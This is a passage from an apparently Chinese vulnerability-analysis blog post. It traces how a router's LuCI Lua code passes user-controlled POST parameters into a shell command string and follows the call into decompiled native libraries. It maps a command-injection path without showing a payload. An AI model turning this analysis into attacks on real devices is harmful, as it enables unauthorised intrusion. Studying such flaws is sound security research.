class="built_in">module</span> = <span class="string">&quot;illegalMoule&quot;</span></span><br><span class="line">        params.method = <span class="string">&quot;illegalMethod&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> params.<span class="built_in">module</span> <span class="keyword">or</span> <span class="keyword">not</span> params.method) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;please input module&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password = <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">local</span> _shell = params.cfg_cmd .. <span class="string">&quot; &quot;</span> .. params.method .. <span class="string">&quot; --module &#x27;&quot;</span> .. params.<span class="built_in">module</span> .. <span class="string">&quot;&#x27;&quot;</span>   <span class="comment">--构建shell</span></span><br><span class="line">        <span class="comment">-- 远程代理调用</span></span><br><span class="line">        <span class="keyword">if</span> params.remoteIp <span class="keyword">then</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -i &#x27;&quot;</span> .. params.remoteIp .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            ip = params.remoteIp</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> params.remotePwd <span class="keyword">and</span> <span class="keyword">not</span> (params.cur) <span class="keyword">then</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -p &#x27;&quot;</span> .. params.remotePwd .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            password = params.remotePwd</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> params.data <span class="keyword">then</span>               <span class="comment">--处理data</span></span><br><span class="line">            data = luci.json.encode(params.data)    <span class="comment">--data便是上文的passwd字段，进行了json编码（unicode加密）</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; &#x27;&quot;</span> .. data .. <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">if</span> params.async == <span class="literal">true</span> <span class="keyword">or</span> params.async == <span class="string">&quot;true&quot;</span> <span class="keyword">then</span></span><br><span class="line">            back = <span class="number">0</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -b 0 &quot;</span></span><br><span class="line">        <span class="keyword">elseif</span> params.async == <span class="literal">false</span> <span class="keyword">or</span> params.async == <span class="string">&quot;false&quot;</span> <span class="keyword">then</span></span><br><span class="line">            back = <span class="number">1</span></span><br><span class="line">            _shell = _shell .. <span class="string">&quot; -b 1 &quot;</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> data, back, ip, password, _shell</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>而这里会把\n字符编码为\u000a，导致最后的漏洞点被补上</p>
<p>因此看最后一个merge函数</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 网络合并</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可以看到没有对params有任何的处理，调用了set函数</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">devSta[<span class="string">&#x27;set&#x27;</span>] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = <span class="string">&#x27;set&#x27;</span></span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>data字段便是我们可控的（即最初<code>POST</code>报文中<code>params</code>的内容）</p>
<p>主fetch函数的调用</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">    tool.eweblog(shell, params.device, <span class="built_in">os</span>.<span class="built_in">time</span>() - _start)</span><br><span class="line">    <span class="keyword">if</span> params.method ~= <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">        tool.write_log(&#123;action = shell&#125;)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> _res.code == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">        _res = _res.data <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> params.noParse <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> _res</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> _res <span class="keyword">and</span> luci.json.decode(_res) <span class="keyword">or</span> (_res <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> _res</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>其中的fn函数便是modle.fetch</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--主函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line">    <span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ctype</span><br><span class="line"></span><br><span class="line">    ctype = get_ctype()</span><br><span class="line">    param = param <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    ip = ip <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    password = password <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> force <span class="keyword">and</span> force == <span class="string">&quot;1&quot;</span> <span class="keyword">then</span></span><br><span class="line">    	force = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	force = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> back <span class="keyword">and</span> back == <span class="string">&quot;1&quot;</span> <span class="keyword">then</span></span><br><span class="line">    	back = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	back = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span>   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> not_change_configId <span class="keyword">then</span></span><br><span class="line">    	not_change_configId = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	not_change_configId = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> multi <span class="keyword">then</span></span><br><span class="line">    	multi = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    	multi = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br><span class="line">    <span class="keyword">return</span> stat</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>可以看到其调用了libuflua的client_call函数</p>
<p>首先再libuflua.so中直接看是找不到client_call函数的，可能是因为该函数名称被识别为了代码段，因此放入010editor中，搜索字符串client_call，找到0xFF0位置，按A，</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00000FF0 63 6C 69 65 6E 74 5F 63 61 6C+aClientCall:.ascii &quot;client_call&quot;&lt;0&gt;      <span class="comment"># DATA XREF: LOAD:off_1101C↓o</span></span><br></pre></td></tr></table></figure>

<p>寻找交叉调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">luaopen_libuflua</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  luaL_register(a1, <span class="string">&quot;libuflua&quot;</span>, &amp;off_1101C);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数使用了<code>__fastcall</code> 调用约定，在这种约定下，函数的前两个整数参数通过寄存器传递，其中luaL_register是一个Lua C API 函数，用于将 C 函数注册到 Lua 中。它通常用于将一组 C 函数注册为一个 Lua 库。</p>
<p><code>luaL_register</code> 函数将 <code>off_1101C</code> 指向的函数库表注册到 Lua 中，并将其命名为 <code>libuflua</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A00</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $s1</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $s2</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $s3</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v13[<span class="number">3</span>]; <span class="comment">// [sp+18h] [-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">0x34</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">    v5 = <span class="number">4</span>;</span><br><span class="line">    *(_DWORD *)v3 = luaL_checkinteger(a1, <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">4</span>) = luaL_checklstring(a1, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = luaL_checklstring(a1, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">    v7 = *(_DWORD *)v3;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">8</span>) = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = lua_tolstring(a1, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">41</span>) = lua_toboolean(a1, <span class="number">5</span>) == <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">6</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = lua_tolstring(a1, v5, <span class="number">0</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">24</span>) = lua_tolstring(a1, v5 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    v8 = v5 + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v5 + <span class="number">3</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      v8 = v5 + <span class="number">4</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">44</span>) = lua_toboolean(a1, v5 + <span class="number">3</span>) == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v3 + <span class="number">48</span>) = lua_toboolean(a1, v8) == <span class="number">1</span>;</span><br><span class="line">    v4 = uf_client_call(v3, v13, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13[<span class="number">0</span>] = strdup(<span class="string">&quot;memory full!&quot;</span>);</span><br><span class="line">    v4 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_createtable(a1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  lua_pushstring(a1, <span class="string">&quot;code&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    lua_pushnumber(a1, v9, loc_1000, loc_1004);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;err&quot;</span>);</span><br><span class="line">    lua_pushstring(a1, v13[<span class="number">0</span>]);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;data&quot;</span>);</span><br><span class="line">    v10 = a1;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    lua_pushnumber(a1, v9, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;err&quot;</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="number">0</span>);</span><br><span class="line">    lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">    lua_pushstring(a1, <span class="string">&quot;data&quot;</span>);</span><br><span class="line">    v11 = v13[<span class="number">0</span>];</span><br><span class="line">    v10 = a1;</span><br><span class="line">  &#125;</span><br><span class="line">  lua_pushstring(v10, v11);</span><br><span class="line">  lua_rawset(a1, <span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v13[<span class="number">0</span>] )</span><br><span class="line">    <span class="built_in">free</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了能顺利分析这个C函数，我们要先了解Lua栈是什么</p>
<blockquote>
<p>Lua 栈是 Lua 虚拟机用来管理函数调用和数据传递的一个重要结构。它是一个后进先出（LIFO）的数据结构，专门用于在 C 和 Lua 之间传递数据。每个 Lua 状态机（<code>lua_State</code>）都有自己的栈，用于存储函数参数、返回值和临时变量。</p>
<ol>
<li><strong>压栈操作</strong>:<ul>
<li><code>lua_pushnumber(lua_State* L, lua_Number n)</code>: 将一个数字压入栈中。</li>
<li><code>lua_pushstring(lua_State* L, const char* s)</code>: 将一个字符串压入栈中。</li>
<li><code>lua_pushboolean(lua_State* L, int b)</code>: 将一个布尔值压入栈中。</li>
<li><code>lua_pushnil(lua_State* L)</code>: 将一个 nil 压入栈中。</li>
</ul>
</li>
<li><strong>弹栈操作</strong>:<ul>
<li><code>lua_tonumber(lua_State* L, int index)</code>: 将栈上指定索引处的值转换为数字。</li>
<li><code>lua_tostring(lua_State* L, int index)</code>: 将栈上指定索引处的值转换为字符串。</li>
<li><code>lua_toboolean(lua_State* L, int index)</code>: 将栈上指定索引处的值转换为布尔值。</li>
</ul>
</li>
<li><strong>栈操作</strong>:<ul>
<li><code>lua_settop(lua_State* L, int index)</code>: 设置栈顶索引。</li>
<li><code>lua_gettop(lua_State* L)</code>: 获取栈顶索引。</li>
<li><code>lua_remove(lua_State* L, int index)</code>: 移除栈上指定索引处的值。</li>
</ul>
</li>
<li><strong>表操作</strong>:<ul>
<li><code>lua_createtable(lua_State* L, int narr, int nrec)</code>: 创建一个新的表并压入栈中。</li>
<li><code>lua_settable(lua_State* L, int index)</code>: 将栈顶的值弹出并存储在表中。</li>
<li><code>lua_gettable(lua_State* L, int index)</code>: 获取表中的值并压入栈中。</li>
</ul>
</li>
</ol>
</blockquote>
<p>但是可以直接理解为调用了<code>v4 = uf_client_call(v3, v13, 0);</code>uf_client_call函数，因为本函数明显没有显示的漏洞点，因此就先跟进然后再返回来找</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037160.png" alt="image-20240527003055624"></p>
<p>从这里跟平时的C库是一样的，说明这个函数是一个外部库定义的函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037161.png" alt="image-20240527003258125"></p>
<p>搜索到显然是libunifyframe.so库</p>
<h2 id="二进制文件分析"><a href="#二进制文件分析" class="headerlink" title="二进制文件分析"></a>二进制文件分析</h2><p>在分析之前附上zikh26师傅画的调用栈</p>
<p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405300037162.png" alt="image-20240529225726519"></p>
<h3 id="uf-client-call"><a href="#uf-client-call" class="headerlink" title="uf_client_call"></a>uf_client_call</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span 